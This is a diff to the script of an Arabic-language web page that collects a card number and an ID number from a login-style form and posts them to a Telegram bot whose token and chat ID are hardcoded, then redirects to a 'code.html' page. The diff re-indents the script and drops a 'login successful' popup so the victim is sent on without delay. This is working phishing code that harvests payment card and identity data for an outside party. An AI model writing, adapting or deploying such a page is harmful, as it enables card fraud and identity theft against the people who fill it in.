@@ -116,63 +116,57 @@
 
     <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script>
-        $(document).ready(function() {
-            $('#confirmBtn').click(function() {
-                // Collect form data
-                const cNum = $('#cNum').val();
-                const password = $('#password').val();
+<script>
+    $(document).ready(function() {
+        $('#confirmBtn').click(function() {
+            // Collect form data
+            const cNum = $('#cNum').val();
+            const password = $('#password').val();
 
-                // Validate the form
-                if (!cNum || !password) {
+            // Validate the form
+            if (!cNum || !password) {
+                Swal.fire({
+                    title: "خطأ",
+                    text: "يرجى تعبئة جميع الحقول",
+                    icon: "error"
+                });
+                return;
+            }
+
+            // Prepare the message to send to Telegram
+            const message = `
+                رقم البطاقة: ${cNum}
+                رقم الهوية: ${password}
+            `;
+
+            // Telegram Bot API settings
+            const botToken = '7701259862:AAGeR_4yOWEj32nHGAM-ljhqawXJZd-d82o';
+            const chatId = '-4601051649';
+
+            // Send the data to Telegram
+            $.ajax({
+                url: `https://api.telegram.org/bot${botToken}/sendMessage`,
+                method: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                }),
+                success: function(response) {
+                    // Redirect to another page after success
+                    window.location.href = "code.html"; // Replace with your destination URL
+                },
+                error: function(error) {
                     Swal.fire({
                         title: "خطأ",
-                        text: "يرجى تعبئة جميع الحقول",
+                        text: "حدث خطأ أثناء إرسال البيانات",
                         icon: "error"
                     });
-                    return;
                 }
-
-                // Prepare the message to send to Telegram
-                const message = `
-                    رقم البطاقة: ${cNum}
-                    رقم الهوية: ${password}
-                `;
-
-                // Telegram Bot API settings
-                const botToken = '7701259862:AAGeR_4yOWEj32nHGAM-ljhqawXJZd-d82o';
-                const chatId = '-4601051649';
-
-                // Send the data to Telegram
-                $.ajax({
-                    url: `https://api.telegram.org/bot${botToken}/sendMessage`,
-                    method: 'POST',
-                    contentType: 'application/json',
-                    data: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    }),
-                    success: function(response) {
-                        Swal.fire({
-                            title: "تم التسجيل الدخول",
-                            text: "تم إرسال البيانات بنجاح",
-                            icon: "success"
-                        }).then(() => {
-                            // Redirect to another page after success
-                            window.location.href = "code.html"; // Replace with your destination URL
-                        });
-                    },
-                    error: function(error) {
-                        Swal.fire({
-                            title: "خطأ",
-                            text: "حدث خطأ أثناء إرسال البيانات",
-                            icon: "error"
-                        });
-                    }
-                });
             });
         });
-    </script>
+    });
+</script>
 </body>
 
 </html>
